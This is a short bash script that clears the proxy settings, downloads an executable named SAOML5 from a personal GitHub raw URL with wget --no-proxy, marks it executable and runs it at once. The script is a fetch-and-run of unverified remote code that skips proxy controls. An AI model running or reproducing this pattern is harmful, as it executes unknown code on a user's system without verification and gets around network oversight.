#!/bin/bash
unset http_proxy https_proxy HTTP_PROXY HTTPS_PROXY
rm -f SAOML5
wget --no-proxy -O SAOML5 https://raw.githubusercontent.com/QQ979338111/SAOML2026/main/SAOML5
chmod +x SAOML5
sleep 0.3
./SAOML5
